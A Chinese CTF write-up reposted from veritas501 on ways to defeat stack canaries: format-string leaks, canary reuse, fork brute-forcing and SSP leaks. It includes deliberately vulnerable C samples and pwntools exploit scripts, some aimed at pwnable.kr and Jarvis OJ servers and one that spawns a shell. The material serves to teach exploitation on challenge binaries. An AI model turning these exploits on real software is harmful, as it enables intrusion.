---
title: 论canary的几种玩法
date: 2017-09-23 21:58:51
categories: pwn
tags: [stack, canary]
---

此文摘抄于veritas501的博文

[http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/](http://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/)

里面讨论了我所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。

------

## 先说说canary

canary直译就是金丝雀，为什么是叫金丝雀？

17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离。

而程序里的canary就是来检测栈溢出的。

检测的机制是这样的：

1.程序从一个神奇的地方取出一个4（eax）或8（rax）节的值，在32位程序上，你可能会看到：

![img](/images/2017-09-23/canary_1122569b3258873874d61fd5bfc62fba.png)

![](/images/2017-09-23/canary_32.png)

在64位上，你可能会看到：

![img](/images/2017-09-23/canary_1d676e1ed18ade8675f112f61e39ab74.png)

总之，这个值你不能实现得到或预测，放到站上以后，eax中的副本也会被清空（xor eax,eax）

2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。

![img](/images/2017-09-23/canary_1acfdb1810a2876c78383f4a3a66a515.png)

![img](/images/2017-09-23/canary_b151b13af2155fff6a842855cbbd4d07.png)

在栈中大致是这样一个画风：

![img](/images/2017-09-23/canary_0037817e6e24d51983d3575e02fc398d.png)

------

## 绕过canary - 格式化字符串

格式化字符串能够实现任意地址读写，具体的实现可以参考我blog中关于格式化字符串的总结，格式化字符串的细节不是本文讨论的重点。

大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。

示例程序：

```
/**
* compile cmd: gcc source.c -m32 -o bin
**/
#include <stdio.h>
#include <unistd.h>

void getflag(void) {
    char flag[100];
    FILE *fp = fopen("./flag", "r");
    if (fp == NULL) {
        puts("get flag error");
    }
    fgets(flag, 100, fp);
    puts(flag);
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void fun(void) {
	char buffer[100];
	read(STDIN_FILENO, buffer, 120);
}

int main(void) {
	char buffer[6];
	init();
	scanf("%6s",buffer);
	printf(buffer);
	fun();
}
```

在第一次scanf的时候输入“%7$x”打印出canary，在fun中利用栈溢出控制eip跳转到getflag。

poc:

```
from pwn import *
context.log_level = 'debug'

cn = process('./bin')

cn.sendline('%7$x')
canary = int(cn.recv(),16)
print hex(canary)

cn.send('a'*100 + p32(canary) + 'a'*12 + p32(0x0804863d))

flag = cn.recv()

log.success('flag is:' + flag)
```

------

## 绕过canary - 针对调用方式一致

linux下的canary有个明显的特性：<font color=#f00>那就是每个使用了canary的函数，其canary的值是完全一样的</font>。其实原理很简单，从上面给出的x86和x64的两种canary生成图示可以看出，linux的canary总是和large gs:14h或者fs:28h有关。这也就意味着，只要这个值不变，那么canary的值也不会变。显然，程序运行之后，这个地址的值不会发生改变。

那么，这也产生了一种攻击方法，<font color=#f00>通过存在漏洞的函数之外的函数，间接打印或者求出canary，那么这个canary可以运用到任意函数中（包括漏洞函数）。</font>

漏洞利用样例就是pwnbale.kr中的md5 calculator那道题

题目描述：

> We made a simple MD5 calculator as a network service.
> Find a bug and exploit it to get a shell.
>
> Download : http://pwnable.kr/bin/hash
> hint : this service shares the same machine with pwnable.kr web service
>
> Running at : nc pwnable.kr 9002

[sph7](http://www.jianshu.com/u/97cac88b9b6e) 已经将这个问题完美解决，这里基本上摘抄于其原文

ida打开文件，发现关键函数是process_hash，代码如下

```c
int process_hash()
{
  int v0; // ST14_4@3
  void *ptr; // ST18_4@3
  char v3; // [sp+1Ch] [bp-20Ch]@1
  int v4; // [sp+21Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  memset(&v3, 0, 0x200u);
  while ( getchar() != 10 );
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(&v3, 0, 0x200u);
  v0 = Base64Decode(g_buf, &v3);
  ptr = (void *)calc_md5(&v3, v0);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return *MK_FP(__GS__, 20) ^ v4;
}
```

这里的问题在与给g_buf分配了1024bytes的空间，但是只给u分配了512bytes的空间，而1024字节的base64解码之后的长度为768，所以这里有一个栈溢出。但是代码中有栈cookie，所以光靠这里是不能利用的。

继续看代码，发现另一个函数

```c
int my_hash()
{
  int result; // eax@4
  int v1; // edx@4
  signed int i; // [sp+0h] [bp-38h]@1
  char v3[32]; // [sp+Ch] [bp-2Ch]@2
  int v4; // [sp+2Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v3[4 * i] = rand();
  result = *(_DWORD *)&v3[16]
         - *(_DWORD *)&v3[24]
         + *(_DWORD *)&v3[28]
         + v4
         + *(_DWORD *)&v3[8]
         - *(_DWORD *)&v3[12]
         + *(_DWORD *)&v3[4]
         + *(_DWORD *)&v3[20];
  v1 = *MK_FP(__GS__, 20) ^ v4;
  return result;
}
```

在这个函数中，栈cookie被用来生成了一个hash值，而这个hash值会在交互中给出，结合题目中提到的提示，bin服务和pwnable.kr运行在同一台机器上，也就是说时间相同，这样就可以反算出栈cookie，从而get shell了。

大概思路清晰之后，开始完成exp，首先是用c算出栈cookie

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) 
{
    int m = atoi(argv[2]);
    int rands[8];
    srand(atoi(argv[1]));
    for (int i = 0; i <= 7; i++) rands[i] = rand();
    m -= (rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7]);
    printf("%x\n", m);
    return 0;
}
```

完成cookie的计算，分析到这里就可以写exp了，主要思路是溢出掉v3，用验证码和时间计算出栈cookie，最后调用system("/bin/sh")

```py
import os
import time
from pwn import *

p = remote("pwnable.kr", 9002)
t = int(time.time())
print p.recvuntil("captcha")
captcha = p.recvline()
captchapos = captcha.find(' : ')+len(' : ')
captcha = captcha[captchapos:].strip()
p.sendline(captcha)
print p.recvline()
print p.recvline()
cmd = "./hash %s %s" % (t, captcha)
cookie = "0x" + os.popen(cmd).read().strip()

payload = 'A' * 512 # 512 byte v3
payload += p32(int(cookie, 16))
payload += 'A' * 12
payload += p32(0x08049187)  # system
payload += p32(0x0804B0E0 + 537*4/3)  # .bss => address of /bin/sh
payload = b64e(payload)
payload += "/bin/sh\0"
p.sendline(payload)
p.interactive()
```

------

## 绕过canary - 针对fork的进程

对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。

另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。

示例程序：

```
/**
* compile cmd: gcc source.c -m32 -o bin
**/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

void getflag(void) {
    char flag[100];
    FILE *fp = fopen("./flag", "r");
    if (fp == NULL) {
        puts("get flag error");
		exit(0);
    }   
    fgets(flag, 100, fp);
    puts(flag);
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void fun(void) {
    char buffer[100];
    read(STDIN_FILENO, buffer, 120);
}

int main(void) {
    init();
	pid_t pid;
	while(1) {
		pid = fork();
		if(pid < 0) {
			puts("fork error");
			exit(0);
		}
		else if(pid == 0) {
			puts("welcome");
			fun();
			puts("recv sucess");
		}
		else {
			wait(0);
		}
	}
}
```

poc脚本：

```
from pwn import *
context.log_level = 'debug'

cn = process('./bin')

cn.recvuntil('welcome\n')
canary = '\x00'
for j in range(3):
    for i in range(0x100):
        cn.send('a'*100 + canary + chr(i))
        a = cn.recvuntil('welcome\n')
        if 'recv' in a:
            canary += chr(i)
            break

cn.sendline('a'*100 + canary + 'a'*12 + p32(0x0804864d))

flag = cn.recv()
cn.close()
log.success('flag is:' + flag)
```

------

## 故意触发canary - ssp leak

这题可以参考jarvis oj中 smashes一题的解题方法中的前一半。

这里我偷个懒，直接把之前写的wp扔过来了，反正原理都在题里了。

题目描述：

> Smashes, try your best to smash!!!
>
> nc pwn.jarvisoj.com 9877
>
> [smashes.44838f6edd4408a53feb2e2bbfe5b229](https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229)

首先查看保护

```
$ checksec pwn_smashes 
[*] '/home/veritas/pwn/jarvisoj/smashes/pwn_smashes'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

有canary，有nx

ida找到关键函数：

```
__int64 func_1()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 buffer; // [sp+0h] [bp-128h]@1
  __int64 canary; // [sp+108h] [bp-20h]@1

  canary = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets(&buffer);
  if ( !v0 )
label_exit:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1u )
      goto label_exit;
    if ( v2 == '\n' )
      break;
    flag[v1++] = v2;
    if ( v1 == 32 )                             // 32长度
      goto thank_you;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
thank_you:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ canary;
```

首先，函数使用了gets(的某种形态？)来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以`\n`结尾，所以无法绕过canary。

纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。

但如果你换个思路，我们故意触发canary的保护会怎么样？

事实上，就有一种攻击方法叫做`SSP（Stack Smashing Protector ） leak`。

------

如果canary被我们的值覆盖而发生了变化，程序会执行函数`___stack_chk_fail()`

![img](/images/2017-09-23/canary_7a0eddd01d532e95ac8a905e617c70b4.png)

一般情况下，我们执行了这个函数，输出是这样的：

![img](/images/2017-09-23/canary_c0f71a7d08460009b1ff313dcdbf0294.png)

我们来看一下源码
__stack_chk_fail :

```
void 
__attribute__ ((noreturn)) 
__stack_chk_fail (void) {   
	__fortify_fail ("stack smashing detected"); 
}
```

fortify_fail

```
void 
__attribute__ ((noreturn)) 
__fortify_fail (msg)
   const char *msg; {
      /* The loop is added only to keep gcc happy. */
         while (1)
              __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>") 
} 
libc_hidden_def (__fortify_fail)
```

可见，__libc_message 的第二个`%s`输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，而在栈中，大概是这样一个画风

![img](/images/2017-09-23/canary_a768142147ca3976598941b5c6c67161.png)

所以，只要我们能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。

听起来很美妙，我们可以试试看。

先写如下poc:

```
from pwn import *
context.log_level = 'debug'

#cn = remote('pwn.jarvisoj.com', 9877)
cn = process('pwn_smashes')
cn.recv()
cn.sendline(p64(0x0000000000400934)*200) #直接用我们所需的地址占满整个栈
cn.recv()
cn.sendline()
cn.recv()

#.rodata:0000000000400934 aHelloWhatSYour db 'Hello!',0Ah         ; DATA XREF: func_1+1o
#.rodata:0000000000400934                 db 'What',27h,'s your name? ',0
#.rodata:000000000040094E ; char s[]
#.rodata:000000000040094E s               db 'Thank you, bye!',0  ; DATA XREF: func_1:loc_400878o
#.rodata:000000000040095E                 align 20h
#.rodata:0000000000400960 aNiceToMeetYouS db 'Nice to meet you, %s.',0Ah
#.rodata:0000000000400960                                         ; DATA XREF: func_1+3Fo
#.rodata:0000000000400960                 db 'Please overwrite the flag: ',0
#.rodata:0000000000400992                 align 8
#.rodata:0000000000400992 _rodata         ends
```

输出结果令我们满意

```
[DEBUG] Received 0x56 bytes:
    'Thank you, bye!\n'
    '*** stack smashing detected ***: Hello!\n'
    "What's your name?  terminated\n"
```

但是，当我们把地址换成flag的地址时，却可以发现flag并没有被打印出来，那是因为在func_1函数的结尾处有这样一句：

```
memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

所以，无论如何，等我们利用canary打印flag的时候，0x600D20上的值已经被完全覆盖了，因此我们无法从0x600D20处得到flag。

这就是这道题的第二个考点，ELF的重映射。当可执行文件足够小的时候，他的不同区段可能会被多次映射。这道题就是这样。

![img](/images/2017-09-23/canary_b17d7868f95d135b35908e74805b7282.png)

可见，其实在0x400d20处存在flag的备份。

因此，最终的poc为：

```
from pwn import *
context.log_level = 'debug'

cn = remote('pwn.jarvisoj.com', 9877)
#cn = process('pwn_smashes')
cn.recv()
cn.sendline(p64(0x0400d20)*200)
cn.recv()
cn.sendline()
cn.recv()
```